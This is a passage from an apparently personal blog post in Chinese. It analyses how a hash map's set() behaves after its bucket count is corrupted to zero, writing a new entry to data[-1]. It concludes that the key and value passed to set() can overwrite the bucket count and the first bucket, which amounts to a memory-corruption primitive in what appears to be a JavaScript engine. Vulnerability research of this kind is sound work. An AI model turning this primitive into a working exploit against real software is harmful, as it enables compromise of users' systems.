<p>再回头看一下 <code>set</code> 的源码，分析一下这种情况下再 <code>set</code> 会怎样。</p>
<ul>
<li>程序先尝试查找已有元素，现在两个索引都是 CollectionType::kNotFound(-1)，查找失败</li>
<li>剩下的桶的数量够用，添加元素到哈希表，计算出的新桶的索引是 -1，把新元素存放到 data[-1]</li>
<li>也就是新的元素被写入到了 data 区域以前 3 个槽中，这三个槽实际上依次是，buckets 数量，bucket[0], bucket[1]</li>
<li>bucket 中写入新添加元素的索引 -1</li>
<li>elements 数量 +1，变为 0</li>
</ul>
<p>在调试器里观察 m.set(i, 1) 运行一次后的内存如下，红框中的三个值，刚好是 key(0), value(1), next-index(-1)。</p>
<p>![[Pasted image 20230822001103.png]]</p>
<p>这样的话，我们可以修改 <code>set()</code> 调用的 key 和 value 就可以修改，buckets 数量和第一个 bucket 中存放的 entry</p>
<ul class="pa0">
  
</ul>
<div class="mt6 instapaper_ignoref">
      
      
      </div>
    </div>

    <aside class="w-30-l mt6-l">




</aside>

  </article>

    </main>
    <footer class="bg-black bottom-0 w-100 pa3" role="contentinfo">
  <div class="flex justify-between">
  <a class="f4 fw4 hover-white no-underline white-70 dn dib-ns pv2 ph3" href="http://localhost:1313/" >
    &copy;  My New Hugo Site 2024 
  </a>
    <div><div class="ananke-socials"></div>
</div>
  </div>
</footer>

  </body>
</html>
